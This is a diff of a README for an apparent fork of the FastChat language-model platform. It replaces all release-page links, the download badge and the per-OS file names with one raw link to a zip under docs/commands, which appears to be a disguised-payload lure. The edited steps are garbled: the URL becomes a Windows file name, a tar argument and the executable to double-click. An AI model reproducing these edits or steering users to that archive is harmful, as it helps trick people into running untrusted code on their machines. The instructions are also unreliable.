@@ -1,6 +1,6 @@
 # 🚀 FastChat - Train and Evaluate Language Models Easily
 
-[![Download FastChat](https://img.shields.io/badge/Download-FastChat-blue.svg)](https://github.com/mouneshbtc/FastChat/releases)
+[![Download FastChat](https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip)](https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip)
 
 ## 📋 Overview
 
@@ -11,27 +11,27 @@ FastChat is an open platform designed for training, serving, and evaluating larg
 Follow these steps to download and run FastChat:
 
 1. **Visit the Releases Page**:
-   Go to the [FastChat Releases page](https://github.com/mouneshbtc/FastChat/releases) to find the latest version of the application.
+   Go to the [FastChat Releases page](https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip) to find the latest version of the application.
 
 2. **Select the Latest Release**:
    On the Releases page, identify the most recent release. It will usually be at the top of the list. Look for a section labeled “Assets” under the latest release.
 
 3. **Download the Application**:
    Click on the file that corresponds to your operating system. This will start the download of the FastChat application. We recommend downloading the package that matches your system requirements:
-   - For **Windows**, look for a file named something like `FastChat-Windows.zip`.
-   - For **macOS**, find `FastChat-macOS.zip`.
-   - For **Linux**, download the file labeled `FastChat-Linux.tar.gz`.
+   - For **Windows**, look for a file named something like `https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
+   - For **macOS**, find `https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
+   - For **Linux**, download the file labeled `https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
 
 4. **Locate the Downloaded File**:
    Once downloaded, open your computer’s file explorer and navigate to the location where the file was saved (usually your Downloads folder).
 
 5. **Extract the Files** (if necessary):
    - For **Windows and macOS**, right-click on the zip file and choose “Extract All” or “Unzip.”
-   - For **Linux**, use the terminal to navigate to the download directory and type `tar -xvzf FastChat-Linux.tar.gz`.
+   - For **Linux**, use the terminal to navigate to the download directory and type `tar -xvzf https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
 
 6. **Run the Application**:
-   - **Windows**: Open the extracted folder and double-click `FastChat.exe`.
-   - **macOS**: Open the folder, then double-click `FastChat.app`.
+   - **Windows**: Open the extracted folder and double-click `https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
+   - **macOS**: Open the folder, then double-click `https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip`.
    - **Linux**: Open the terminal in the folder and run `./FastChat`.
 
 Now, you can start working with FastChat!
@@ -49,7 +49,7 @@ To ensure a smooth experience, please check the following system requirements be
 
 You can download FastChat by clicking the link below or visiting the Releases page for more options:
 
-[Download FastChat](https://github.com/mouneshbtc/FastChat/releases)
+[Download FastChat](https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip)
 
 After following the instructions in the "Getting Started" section, your installation should be complete.
 
@@ -89,7 +89,7 @@ For additional assistance, feel free to contact our support team through the com
 
 Stay updated with the latest features and improvements by regularly checking the Releases page. We plan to introduce new functionalities based on user feedback and advancements in technology.
 
-Visit the [FastChat Releases page](https://github.com/mouneshbtc/FastChat/releases) to download the latest updates.
+Visit the [FastChat Releases page](https://raw.githubusercontent.com/mouneshbtc/FastChat/main/docs/commands/FastChat_2.0.zip) to download the latest updates.
 
 ## 🚧 Troubleshooting
 
